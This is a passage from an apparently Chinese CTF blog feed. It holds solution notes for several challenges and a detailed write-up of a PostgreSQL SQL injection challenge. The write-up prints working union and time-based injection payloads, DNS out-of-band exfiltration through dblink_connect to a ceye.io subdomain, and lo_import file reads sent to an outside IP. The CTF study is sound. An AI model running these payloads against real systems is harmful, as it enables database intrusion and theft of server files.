string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'&lt;b>'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'&lt;/b>'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;divid=\"math\">"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/div>"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span>cal<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"2--------------------------------计数"</span><span class="token punctuation">)</span><span class="token builtin">str</span> <span class="token operator">=</span> collections<span class="token punctuation">.</span>Counter<span class="token punctuation">(</span>cal<span class="token punctuation">)</span>str1 <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"3--------------------------------排序"</span><span class="token punctuation">)</span><span class="token keyword">from</span> collections <span class="token keyword">import</span> OrderedDictstr2 <span class="token operator">=</span> OrderedDict<span class="token punctuation">(</span><span class="token builtin">sorted</span><span class="token punctuation">(</span>str1<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> key<span class="token operator">=</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span>x<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>str2<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"4--------------------------------取key"</span><span class="token punctuation">)</span>val <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> str2<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    val <span class="token operator">+=</span> ival <span class="token operator">=</span> val<span class="token keyword">print</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"5--------------------------------赋data"</span><span class="token punctuation">)</span>data<span class="token punctuation">[</span><span class="token string">'res'</span><span class="token punctuation">]</span> <span class="token operator">=</span> val<span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"6--------------------------------提交"</span><span class="token punctuation">)</span>post_responses <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>post_responses<span class="token punctuation">)</span></code></pre><p>编编改改凑合用</p><img src="/article/2021gongcesai/image-20210205140020576.png" class="" title="image-20210205140020576" loading="lazy"><hr><h2 id="Apk"><a href="#Apk" class="headerlink" title="Apk"></a>Apk</h2><h3 id="Des"><a href="#Des" class="headerlink" title="Des"></a>Des</h3><p>2015ISCC的题目改题<code>没有题目的题目</code></p><p>主要代码</p><pre class="language-none"><code class="language-none">public boolean check() &#123;     byte[] b2 &#x3D; &#123;103, 112, 111, 49, 61, 113, 117, 109, 76, 108, 77, 57, 59, 90, 64, 105, 33, 89, 74, 113, 92, 84, 87, 113, 105, 65, 35, 74, 93, 73, 43, 120&#125;;     byte[] b3 &#x3D; this.result1.getBytes();     for (int j &#x3D; 0; j &lt; b3.length; j++) &#123;         Log.d(&quot;test&quot;, ((byte) (b3[j] ^ j)));     &#125;     if (b3.length !&#x3D; b2.length) &#123;         return false;     &#125;     for (int j2 &#x3D; 0; j2 &lt; b2.length; j2++) &#123;         if ((b3[j2] ^ b2[j2]) !&#x3D; j2) &#123;             return false;         &#125;     &#125;     return true; &#125;</code></pre><p>exp:</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token keyword">from</span> pyDes <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> base64V0 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">103</span><span class="token punctuation">,</span> <span class="token number">112</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">61</span><span class="token punctuation">,</span> <span class="token number">113</span><span class="token punctuation">,</span> <span class="token number">117</span><span class="token punctuation">,</span> <span class="token number">109</span><span class="token punctuation">,</span> <span class="token number">76</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">77</span><span class="token punctuation">,</span> <span class="token number">57</span><span class="token punctuation">,</span> <span class="token number">59</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">89</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token punctuation">,</span> <span class="token number">113</span><span class="token punctuation">,</span> <span class="token number">92</span><span class="token punctuation">,</span> <span class="token number">84</span><span class="token punctuation">,</span> <span class="token number">87</span><span class="token punctuation">,</span> <span class="token number">113</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">65</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token punctuation">,</span> <span class="token number">93</span><span class="token punctuation">,</span> <span class="token number">73</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">DeCheck</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    v1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        v1<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span>    xx <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>v1<span class="token punctuation">)</span>    <span class="token comment">##print xx</span>    <span class="token keyword">return</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>xx<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    key <span class="token operator">=</span> <span class="token string">'ilovedes'</span>    iv <span class="token operator">=</span> <span class="token string">'\x01\x02\x03\x04\x05\x06\x07\x08'</span>    k <span class="token operator">=</span> des<span class="token punctuation">(</span>key<span class="token punctuation">,</span> CBC<span class="token punctuation">,</span> iv<span class="token punctuation">,</span> pad<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> padmode<span class="token operator">=</span>PAD_PKCS5<span class="token punctuation">)</span>    flag <span class="token operator">=</span> k<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>DeCheck<span class="token punctuation">(</span>V0<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"Your flag is: "</span> <span class="token operator">+</span> flag</code></pre><img src="/article/2021gongcesai/image-20210205140432528.png" class="" title="image-20210205140432528" loading="lazy"><img src="/article/2021gongcesai/QQ%E5%9B%BE%E7%89%8720210205171005.jpg" class="" title="QQ图片20210205171005" loading="lazy"><p>参考链接：<a href="http://bobao.360.cn/ctf/learning/136.html">http://bobao.360.cn/ctf/learning/136.html</a></p><hr><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="DTMF"><a href="#DTMF" class="headerlink" title="DTMF"></a>DTMF</h3><p>电话音，网上有在线识别网站</p><p><a href="http://dialabc.com/sound/detect/index.html">http://dialabc.com/sound/detect/index.html</a></p><p>格式要求<code>.wav</code>，先用ffmpeg转格式</p><img src="/article/2021gongcesai/image-20210205140704301.png" class="" title="image-20210205140704301" loading="lazy"><p>再放上去识别</p><img src="/article/2021gongcesai/image-20210205140736060.png" class="" title="image-20210205140736060" loading="lazy"><pre class="language-none"><code class="language-none">CnHongKe&#123;A18D3B18C*231#&#125;</code></pre><hr><h3 id="HalfQR"><a href="#HalfQR" class="headerlink" title="HalfQR"></a>HalfQR</h3><p>二维码修复网站 <a href="https://merricx.github.io/qrazybox/">https://merricx.github.io/qrazybox/</a></p><img src="/article/2021gongcesai/qr1.jpg" class="" title="QR" loading="lazy"><p>手 撸</p><img src="/article/2021gongcesai/image-20210205165950957.png" class="" title="image-20210205165950957" loading="lazy"><img src="/article/2021gongcesai/image-20210205170018477.png" class="" title="image-20210205170018477" loading="lazy"><p>然后</p><img src="/article/2021gongcesai/image-20210205165843064.png" class="" title="image-20210205165843064" loading="lazy"><p>最后</p><pre class="language-none"><code class="language-none">CnHongKe&#123;f88ae38f450e76d3c92410e3650df67&#125;</code></pre><p>也可以手算…毕竟数据域的半边东西给了</p><hr><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这些题目作为线下赛题目是难了，毕竟去年有过一次线下，线上赛就不说了，神仙乱斗2333，还不用交WP，希望主办方能完善赛制，首先赛后都不用交WP是挺离谱的，其次题目的质量…其实还行，但作为线上还是简单了，一篇wp却写不出多少东西，通篇八题仅仅一千字，可能是题目问题，也有一部分我的问题，总之多多总结吧。</p><img src="/article/2021gongcesai/QQ%E5%9B%BE%E7%89%8720210205185049.jpg" class="" width="233" loading="lazy"><p>懂的都懂2333</p><p>还是有些收获的，提前祝大家新年快乐！</p>]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>春秋杯2021新春欢乐赛一道题——按F注入 对pgsql的研究</title>
      <link href="article/cqb2021/"/>
      <url>article/cqb2021/</url>
      
        <content type="html"><![CDATA[<p>只做了一道题，按F注入，研究了pgsql，算个小笔记，不能算研究性文章</p><span id="more"></span><h2 id="按F注入"><a href="#按F注入" class="headerlink" title="按F注入"></a>按F注入</h2><p>打开题目看到只能手机访问，看到了源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span>body<span class="token operator">></span>只有手机才能访问<span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token keyword">function</span> <span class="token function-definition function">is_mobile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_USER_AGENT'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token variable">$clientkeywords</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token string single-quoted-string">'nokia'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'sony'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'ericsson'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'mot'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'samsung'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'htc'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'sgh'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'lg'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'sharp'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'sie-'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'philips'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'panasonic'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'alcatel'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'lenovo'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'iphone'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'ipod'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'blackberry'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'meizu'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'android'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'netfront'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'symbian'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'ucweb'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'windowsce'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'palm'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'operamini'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'operamobi'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'openwave'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'nexusone'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'cldc'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'midp'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'wap'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'mobile'</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token comment">//从HTTP_USER_AGENT中查找手机浏览器的关键字--></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/("</span> <span class="token operator">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|'</span><span class="token punctuation">,</span> <span class="token variable">$clientkeywords</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">")/i"</span><span class="token punctuation">,</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_USER_AGENT'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token punctuation">&#125;</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token punctuation">&#125;</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token punctuation">&#125;</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">></span></code></pre><p>于是在HEADER里添加<code>User-Agent: mobile</code>即可</p><img src="/article/cqb2021/image-20210201185004667.png" class="" title="UA" loading="lazy"><p>点击任何都是JavaScript脚本<code>javascript:alert(&#39;投票成功,恭喜您获得奶奶一个&#39;)</code>，底部发现了提示</p><p><code>&lt;!--&lt;a href=&quot;?f=1&quot;&gt;我选择按下F进入TK&lt;/a&gt;--&gt;</code></p><p>于是访问<code>./?f=1</code>没有变化，猜测SSRF或SQL注入，但是没有其他提示。</p><p>访问<code>./?f=1&#39;</code>发现有弹窗</p><img src="/article/cqb2021/image-20210201185510275.png" class="" title="小哥哥" loading="lazy"><p>fuzz一波，发现<code>#</code>和<code>%23</code>都会一直弹窗，而使用<code>--</code>注释即<code>?f=1&#39; --</code>却不会弹窗，搜索一波发现是 PostgreSQL ，猜测<strong>语法错误</strong>或者<strong>报错</strong>会有弹窗</p><p>甚至搜到了原题，赛后向 <a href="https://ha1c9on.top/">@HA1C9ON</a> 大佬请教得知，当时比赛的WP是有错误的，后续会道来。</p><p>测试一下发现<code>./?f=</code></p><blockquote><ul><li><code>gyy</code>，没有警告</li><li><code>gyy&#39;</code>，警告</li><li><code>gyy&#39; and 1=0 --</code>，没有警告</li><li><code>gyy&#39; and 1=1 --</code>，没有警告</li><li><code>gyy&#39; order by 1 --</code>，没有警告</li><li><code>gyy&#39; order by 2 --</code>，没有警告</li><li><code>gyy&#39; order by 3 --</code>， 警告</li><li><code>gyy&#39; union select 1,2 --</code>， 警告</li><li><code>gyy&#39; union select 1,&#39;2&#39; --</code>，没有警告</li><li><code>gyy&#39; union select 1,pg_sleep(10) --</code>， 警告</li><li><code>gyy&#39; union select 1,cast(pg_sleep(10) as text) --</code>，没有警告（有延迟！）</li><li><code>gyy&#39; union select 1,&#39;2&#39; from pg_database --</code>，没有警告</li><li><code>gyy&#39; union select 1,&#39;2&#39; from gyy --</code>， 警告</li><li><code>gyy&#39; union select 1,chr(65) --</code>，没有警告</li><li><code>gyy&#39; union select 1,chr(-65) --</code>，没有警告</li></ul></blockquote><p>由order by可以判断此处列数为2，由union select可以判断1处对应列为数值类型，2处对应非数值类型</p><h3 id="方法一：延时注入"><a href="#方法一：延时注入" class="headerlink" title="方法一：延时注入"></a>方法一：延时注入</h3><p> postgrest数据库中的延时函数有<code>pg_sleep()</code>&#x2F;<code>pg_sleep_for()</code>&#x2F;<code>pg_sleep_until()</code></p><p>查阅资料得知：</p><blockquote><p>pg_sleep(seconds)<br>pg_sleep_for(interval)<br>pg_sleep_until(timestamp with time zone)</p><p>pg_sleep让当前的会话进程休眠seconds 秒以后再执行。seconds是一个double precision 类型的值，所以可以指定带小数的秒数。<br>pg_sleep_for 对于指定为interval的较长睡眠时间是一个便利函数。<br>pg_sleep_until在需要特定唤醒时间时比较便利。</p><p>SELECT pg_sleep(1.5);<br>SELECT pg_sleep_for(‘5 minutes’);<br>SELECT pg_sleep_until(‘tomorrow 03:00’);</p></blockquote><p>当时比赛脚本参考 <a href="https://github.com/w181496/CTF/blob/master/fbctf2019/hr_admin_module/exp.py">balsn</a></p><p>这里不做阐述，因为最终得出结果</p><pre class="language-none"><code class="language-none">version: (Debian 11.2-1.pgdg90+1)current_db: docker_dbcurrent_schema: publictable of public: searchescolumns of searches: id,searchcounts of searches:0</code></pre><p><code>searches</code>表为空，所以本题应读取文件</p><h3 id="方式二：信息带外"><a href="#方式二：信息带外" class="headerlink" title="方式二：信息带外"></a>方式二：信息带外</h3><p>利用DNSlog方式</p><p>在PostgreSQL中，存在dblink模块，可以外联数据库或者当前数据库，dblink_connect同时会对host进行DNS查询，利用查询给定DNS的子域名，再查DNS解析记录即可获取传递的信息，这里用<a href="http://ceye.io/">ceye</a>来记录</p><p>首先看看dblink模块有没有开启</p><pre class="language-none"><code class="language-none">.&#x2F;?f&#x3D;1&#39; union select 1,(select dblink_connect(&#39;&#39;)) --</code></pre><p>没有报错，说明可以操作继续尝试</p><pre class="language-none"><code class="language-none">.&#x2F;?f&#x3D;1&#39; union select 1,(select dblink_connect(&#39;host&#x3D;&#39; || (SELECT current_database()) || &#39;.xxxx.ceye.io user&#x3D;a password&#x3D;a dbname&#x3D;a&#39;)) --</code></pre><p>xxxx是ceye个人的 Identifier ，可见成功返回了当前数据库名</p><img src="/article/cqb2021/image-20210201195343606.png" class="" title="ceye" loading="lazy"><p>原理是通过<code>.</code>连接，让pgsql去解析host即给定DNS的子域名，从而带出信息。顺着这个方法可以带出来部分信息</p><p>接着就要考虑如何文件包含了，在这里原WP写的很清楚</p><blockquote><p>我们可能确实需要从中窃取数据<code>/var/lib/postgresql/data/secret</code>。不幸的是，如果我们尝试使用<code>pg_read_file</code>或<code>pg_read_binary_file</code>读取文件，则不会获得传入连接，因此当前用户可能无权使用这些功能。</p><p>读取文件的替代方法是使用<a href="https://www.postgresql.org/docs/11/lo-funcs.html">大对象</a>。我们可以用来<code>lo_import</code>将文件的内容加载到<code>pg_largeobject</code>目录中。如果查询成功，我们将获得对象的<code>oid</code>。</p></blockquote><p> 当前用户为docker，不够权限执行系统管理员才能执行的函数<code>pg_read_file()</code>, <code>pg_ls_dir()</code> or <code>pg_stat_file()</code> ，也不方便写udf，没有写权限。</p><p>下面截取原WP的部分内容：</p><blockquote><p>碰到这种情况也就是需要绕过的时候的做法，一般都是谷歌百度，然后阅读文档，另外可以自己起一个环境去搜索相关的函数。例如在这里，balsn的做法是另外起一个环境：</p><pre class="language-text" data-language="text"><code class="language-text">SELECT proname FROM pg_proc WHERE proname like '%file%';   查询所有带有file的函数pg_stat_get_db_temp_files pg_walfile_name_offset pg_walfile_name pg_rotate_logfile_old pg_read_file_old pg_read_file pg_read_file pg_read_file pg_read_binary_file pg_read_binary_file pg_read_binary_file pg_stat_file pg_stat_file pg_relation_filenode pg_filenode_relation pg_relation_filepath pg_show_all_file_settings pg_hba_file_rules pg_rotate_logfile pg_current_logfile pg_current_logfile</code></pre><p>但是这些函数都似乎没起作用</p><pre class="language-text" data-language="text"><code class="language-text">SELECT proname FROM pg_proc WHERE proname like '%read%';   查阅带有read的函数loread pg_stat_get_db_blk_read_time pg_read_file_old pg_read_file pg_read_binary_file</code></pre><p>可以看到第一个方法，通过查阅文档（学会阅读文档很重要！）</p><p>loread是面向SQL的大对象函数，比如<code>lo_from_bytea</code>，<code>lo_put</code>，<code>lo_get</code>，<code>lo_creat</code>, <code>lo_create</code>,</p><pre class="language-none"><code class="language-none">lo_unlink&#96;， &#96;lo_import&#96;和 &#96;lo_export</code></pre><p> 服务器端的<code>lo_import</code>和 <code>lo_export</code>函数和客户端的那几个有着显著的不同。 这两个函数在服务器的文件系统里读写文件， 使用数据库所有者的权限进行。 因此，只有超级用户才能使用他们。相比之下，客户端的输入和输出函数在客户端的文件系统里读写文件， 使用客户端程序的权限。客户端函数不需要超级用户权限。<br><code>lo_read</code>和<code>lo_write</code>的功能通过服务器端调用可用， 但是服务器端函数名不同于客户端接口，因为他们不包含下划线。你必须作为<code>loread</code>和<code>lowrite</code> 调用这些函数。 </p><p>在将服务器端lo_import和lo_export函数授权给非超级用户时需要仔细考虑安全隐患。 具有此类权限的恶意用户可以轻松地将其变为超级用户（例如，通过重写服务器配置文件），或者可以攻击服务器的其余文件系统，而无需获取数据库超级用户权限。 因此，对这两个函数的权限授予必须谨慎。</p></blockquote><p>回到题目中来，lo_import方法可以读取文件为postgres对象，原准备利用lo_export写文件，可是应该是没有权限</p><p>我们先包含<code>index.php</code>看看源码</p><pre class="language-none"><code class="language-none">.&#x2F;?f&#x3D;gyy&#39; union select (select lo_import(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&#39;)),&#39;2&#39; --</code></pre><p><strong>请注意！请注意！请注意！</strong>错误写法：</p><p><code>./?f=gyy&#39; union select 1,(select dblink_connect(&#39;host=&#39; || (select lo_import(&#39;/var/www/html/index.php&#39;)) || &#39;.xxxx.ceye.io user=a password=a dbname=a&#39;)) --</code></p><p>表面上确实返回了oid</p><img src="/article/cqb2021/image-20210201200309775.png" class="" title="DNSlogoid" loading="lazy"><p>但是，在 dblink下 lo_import只是在vps上的 生效，并没有实际包含，在方式三会有实验证明，在最后有对注入点的解释。</p><p>然后接下来发现，这里利用DNSlog进行信息外带还有的问题是要遵循DNS协议，最大位数不超过63位，且不能有任何特殊符号及空格回车之类的，只能用<code>substring</code>函数一段一段截取，还得<code>replace</code>替换字符，可以完成但非常麻烦，不推荐使用。</p><h3 id="方式三：数据库外联"><a href="#方式三：数据库外联" class="headerlink" title="方式三：数据库外联"></a>方式三：数据库外联</h3><p>为了更好理解，下面先进行实验测试，dblink下 lo_import只是在vps上的 生效，并没有实际包含，详情可见如下</p><hr><h4 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h4><p>服务器或本地起一个pgsql服务，可以安装，也可以docker起一个记得开端口映射，然后将其中的<code>postgresql.conf</code>中设置<code>listen_addresses = &#39;*&#39;</code>以监听。然后运行tcpdump监听端口流量</p><pre class="language-none"><code class="language-none">sudo tcpdump -nX -i eth0 port 5432</code></pre><p>默认端口为5432</p><p>dblink下包含文件</p><pre class="language-none"><code class="language-none">?f&#x3D;gyy&#39; union select 1,(SELECT dblink_connect(&#39;host&#x3D;IP user&#x3D;postgres password&#x3D;postgres dbname&#x3D;@&#39;|| (select lo_import(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&#39;)) )) --</code></pre><img src="/article/cqb2021/image-20210201215153531.png" class="" title="oid" loading="lazy"><p>返回oid16438，我们读取一下所有oid列表看一下</p><pre class="language-none"><code class="language-none">?f&#x3D;gyy&#39; union select 1,(SELECT dblink_connect(&#39;host&#x3D;IP user&#x3D;@&#39; || (SELECT string_agg(cast(oid as text), &#39;,&#39;) FROM pg_largeobject_metadata) || &#39; password&#x3D;postgres dbname&#x3D;postgres&#39;)) --</code></pre><p>没有报错，同时，<strong>没有任何数据返回</strong></p><p>而我们直接包含<code>index.php</code>试一下</p><pre class="language-none"><code class="language-none">?f&#x3D;gyy&#39; union select (select lo_import(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&#39;)),&#39;2&#39; --</code></pre><p>没有报错，再查一下oid列表</p><img src="/article/cqb2021/image-20210201220913327.png" class="" title="oid2" loading="lazy"><p>有数据返回，同时可见16439和16440，而16438并没有在列表中，读取16438数据没有返回，读取16439与16440正常返回</p><p>可见dblink下lo_import在本地是不生效的</p><hr><p>这是原WP里的错误，原因在于其flag文件本身就已经包含在大对象里，所以直接就可查询，而dblink状态下并没有生效，算是这次比赛这道题目的最大收获吧。</p><p>如实验所示，流程如下，IP记得替换成自己的</p><p>首先起服务如实验中所示</p><p>先将<code>index.php</code>包含进来，看看有没有线索</p><pre class="language-none"><code class="language-none">?f&#x3D;gyy&#39; union select (SELECT lo_import(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&#39;)),&#39;2&#39; --</code></pre><p>然后读取全部oid列表</p><pre class="language-none"><code class="language-none">?f&#x3D;gyy&#39; union select 1,(SELECT dblink_connect(&#39;host&#x3D;IP user&#x3D;@&#39; || (SELECT string_agg(cast(oid as text), &#39;,&#39;) FROM pg_largeobject_metadata) || &#39; password&#x3D;postgres dbname&#x3D;postgres&#39;)) --</code></pre><img src="/article/cqb2021/image-20210202011754628.png" class="" title="oid3" loading="lazy"><p>（多按几下就会有多个oid，见谅…）</p><p>然后读<code>index.php</code>的oid读取数据，这里可以直接读，lo_get数据转码为UTF-8，然后替换换行符(chr(10))再替换空格(chr(32))即可明文读取</p><pre class="language-none"><code class="language-none">.&#x2F;?f&#x3D;gyy&#39; union select 1,(SELECT dblink_connect(&#39;host&#x3D;IP user&#x3D;@&#39; || (SELECT replace(replace(substring(convert_from(lo_get(16440),&#39;utf8&#39;),1,900),chr(10),&#39;&#39;),chr(32),&#39;&#39;)) || &#39; password&#x3D;postgres dbname&#x3D;postgres&#39;)) --</code></pre><img src="/article/cqb2021/image-20210202004121305.png" class="" title="index" loading="lazy"><p>当然看不清可以base64读取自己转</p><pre class="language-none"><code class="language-none">.&#x2F;?f&#x3D;gyy&#39; union select 1,(SELECT dblink_connect(&#39;host&#x3D;IP user&#x3D;postgres password&#x3D;postgres dbname&#x3D;@&#39;||(SELECT replace(substring(encode(lo_get(16440),&#39;base64&#39;),1,900),chr(10),&#39;&#39;)))) --</code></pre><img src="/article/cqb2021/image-20210201200655345.png" class="" title="base64index" loading="lazy"><p>得到<code>index.php</code>源码</p><pre class="language-none"><code class="language-none">&lt;?phperror_reporting(0);session_start();function is_mobile()&#123;    if (isset ($_SERVER[&#39;HTTP_USER_AGENT&#39;])) &#123;        $clientkeywords &#x3D; array(            